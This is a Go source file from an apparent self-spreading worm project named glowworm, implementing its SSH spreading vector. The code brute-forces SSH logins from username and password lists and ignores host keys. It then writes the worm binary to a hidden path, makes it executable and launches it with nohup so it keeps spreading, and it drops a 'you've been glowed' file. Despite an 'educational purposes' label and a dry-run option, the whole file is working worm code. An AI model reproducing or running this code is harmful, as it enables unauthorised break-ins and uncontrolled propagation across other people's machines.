/*
// Author: Aliasgar Khimani (NovusEdge)
// Project: github.com/ARaChn3/glowworm
//
// Copyright: MIT License
// See the LICENSE file for more info.
*/

// Package vectors provides spreading mechanisms.
// This file implements the SSH spreading vector.

package vectors

import (
	"fmt"
	"io"
	"time"

	"golang.org/x/crypto/ssh"
)

// SSHVector spreads by brute-forcing SSH credentials.
//
// The attack sequence:
// 1. Try username/password combinations until one works
// 2. Upload the worm binary via SCP
// 3. Execute the binary on the remote system
//
// This is one of the most common worm spreading techniques
// and works because many systems use weak/default credentials.
type SSHVector struct {
	// Config holds usernames, passwords, and timeouts
	Config Config

	// Port to connect to (default: 22)
	Port int

	// RemotePath where the worm will be copied
	RemotePath string
}

// NewSSHVector creates an SSH vector with default settings.
func NewSSHVector() *SSHVector {
	return &SSHVector{
		Config:     DefaultConfig(),
		Port:       22,
		RemotePath: "/tmp/.glowworm",
	}
}

// Name returns the vector identifier.
func (v *SSHVector) Name() string {
	return "ssh"
}

// Check verifies if SSH is available on the target.
func (v *SSHVector) Check(target string) bool {
	// Just try to connect - actual auth check is expensive
	addr := fmt.Sprintf("%s:%d", target, v.Port)

	config := &ssh.ClientConfig{
		User:            "root",
		Auth:            []ssh.AuthMethod{ssh.Password("invalid")},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         time.Duration(v.Config.Timeout) * time.Second,
	}

	conn, err := ssh.Dial("tcp", addr, config)
	if err != nil {
		// Connection refused = no SSH
		// Auth failed = SSH is there, just wrong creds
		return err.Error() != "dial tcp: connection refused"
	}
	conn.Close()
	return true
}

// Spread attempts to compromise the target via SSH.
//
// It tries all username/password combinations, and if one works,
// uploads and executes the payload.
func (v *SSHVector) Spread(target string, payload []byte) (bool, error) {
	addr := fmt.Sprintf("%s:%d", target, v.Port)

	// Try each username/password combination
	for _, user := range v.Config.Usernames {
		for _, pass := range v.Config.Passwords {
			if v.Config.DryRun {
				fmt.Printf("[DRY RUN] Would try %s@%s with password '%s'\n", user, target, pass)
				continue
			}

			// Attempt authentication
			client, err := v.connect(addr, user, pass)
			if err != nil {
				continue // Wrong credentials, try next
			}

			// Success - we're in
			fmt.Printf("[SSH] Authenticated as %s@%s\n", user, target)

			// Upload the payload
			if err := v.uploadPayload(client, payload); err != nil {
				client.Close()
				return false, fmt.Errorf("upload failed: %w", err)
			}

			// Execute the payload
			if err := v.executePayload(client); err != nil {
				client.Close()
				return false, fmt.Errorf("execution failed: %w", err)
			}

			// Drop the "you've been glowed" file
			if err := v.dropGlowFile(client); err != nil {
				// Non-fatal, continue
				fmt.Printf("[SSH] Warning: could not drop glow file: %v\n", err)
			}

			client.Close()
			return true, nil
		}
	}

	return false, fmt.Errorf("no valid credentials found")
}

// connect establishes an SSH connection with the given credentials.
func (v *SSHVector) connect(addr, user, pass string) (*ssh.Client, error) {
	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		// In real malware, you'd want to verify host keys
		// For educational purposes, we skip this
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         time.Duration(v.Config.Timeout) * time.Second,
	}

	return ssh.Dial("tcp", addr, config)
}

// uploadPayload copies the worm binary to the remote system.
func (v *SSHVector) uploadPayload(client *ssh.Client, payload []byte) error {
	// Open a session for SCP
	session, err := client.NewSession()
	if err != nil {
		return err
	}
	defer session.Close()

	// Use a simple approach: write to stdin while running cat
	go func() {
		w, _ := session.StdinPipe()
		defer w.Close()
		w.Write(payload)
	}()

	// cat to file and make executable
	cmd := fmt.Sprintf("cat > %s && chmod +x %s", v.RemotePath, v.RemotePath)
	return session.Run(cmd)
}

// executePayload runs the worm on the remote system.
func (v *SSHVector) executePayload(client *ssh.Client) error {
	session, err := client.NewSession()
	if err != nil {
		return err
	}
	defer session.Close()

	// Run in background with nohup so it survives session close
	cmd := fmt.Sprintf("nohup %s spread > /dev/null 2>&1 &", v.RemotePath)
	return session.Run(cmd)
}

// dropGlowFile creates the "you've been glowed" marker file.
func (v *SSHVector) dropGlowFile(client *ssh.Client) error {
	session, err := client.NewSession()
	if err != nil {
		return err
	}
	defer session.Close()

	// Also open the funny video
	glowContent := getGlowContent()

	stdin, err := session.StdinPipe()
	if err != nil {
		return err
	}

	go func() {
		defer stdin.Close()
		io.WriteString(stdin, glowContent)
	}()

	// Write to home directory and also try to open URL
	cmd := `cat > ~/youve-been-glowed.txt && (xdg-open "https://youtu.be/VDYZH3KYBTs" 2>/dev/null || true)`
	return session.Run(cmd)
}

// getGlowContent returns the content for the marker file.
func getGlowContent() string {
	return `
    *  .  *
       *  YOU'VE BEEN GLOWED  *
  .        *    .        *
      ___
     /   \      *
    | o o |  .
    |  >  |       *
     \___/  .
       |
      /|\     *
     / | \
       |    .
      / \
     /   \  *

  https://youtu.be/VDYZH3KYBTs

  This system was visited by glowworm.
  For educational purposes only.

  github.com/ARaChn3/glowworm
`
}
